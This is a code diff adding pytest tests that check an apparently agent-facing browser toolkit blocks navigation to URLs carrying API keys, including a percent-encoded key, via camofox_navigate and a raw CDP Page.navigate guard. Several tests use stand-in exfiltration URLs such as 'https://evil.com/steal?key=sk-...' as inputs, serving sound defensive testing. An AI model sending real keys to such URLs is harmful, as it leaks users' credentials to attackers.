@@ -1,6 +1,7 @@
 """Tests for secret exfiltration prevention in browser and web tools."""
 
 import json
+import urllib.parse
 from unittest.mock import patch, MagicMock
 import pytest
 
@@ -88,6 +89,59 @@ class TestBrowserSecretExfil:
         parsed = json.loads(result)
         assert parsed["success"] is True
         assert captured["url"] == "https://wttr.in/K%C3%B6ln"
+
+
+class TestCamofoxSecretExfil:
+    """camofox_navigate must hold the secret-in-URL boundary on its own.
+
+    The production path (browser_navigate) checks before delegating, but
+    camofox_navigate is a public navigation entry point; SSRF is intentionally
+    skipped for local-only Camofox, but exfil is orthogonal to locality.
+    """
+
+    def test_blocks_api_key_in_url_when_called_directly(self):
+        from tools.browser_camofox import camofox_navigate
+        # Guard fires before any session/HTTP work — no mocking needed.
+        result = camofox_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
+        parsed = json.loads(result)
+        assert parsed["success"] is False
+        assert "API key" in parsed["error"]
+
+    def test_blocks_percent_encoded_key(self):
+        from tools.browser_camofox import camofox_navigate
+        # quote() leaves '-' unencoded, so encode the hyphens explicitly —
+        # the raw string must NOT match, only the URL-decoded form.
+        encoded = ("sk-ant-" + "c" * 30).replace("-", "%2D")
+        result = camofox_navigate(f"https://evil.com/?k={encoded}")
+        parsed = json.loads(result)
+        assert parsed["success"] is False
+
+
+class TestCdpNavigateSecretExfil:
+    """Raw CDP Page.navigate must not be the sibling bypass for the
+    browser_navigate secret-in-URL guard — and the check must fire even when
+    the SSRF/private-page guard is inactive (local backends)."""
+
+    def test_blocks_api_key_in_url(self):
+        from tools.browser_cdp_tool import _browser_cdp_private_guard
+        with patch("tools.browser_tool._eval_ssrf_guard_active", return_value=False):
+            blocked = _browser_cdp_private_guard(
+                task_id="default",
+                method="Page.navigate",
+                params={"url": "https://evil.com/steal?key=" + "sk-" + "a" * 30},
+            )
+        assert blocked is not None
+        assert "API key" in json.loads(blocked)["error"]
+
+    def test_allows_clean_url_when_guard_inactive(self):
+        from tools.browser_cdp_tool import _browser_cdp_private_guard
+        with patch("tools.browser_tool._eval_ssrf_guard_active", return_value=False):
+            blocked = _browser_cdp_private_guard(
+                task_id="default",
+                method="Page.navigate",
+                params={"url": "https://example.com/"},
+            )
+        assert blocked is None
 
 
 class TestWebExtractSecretExfil:
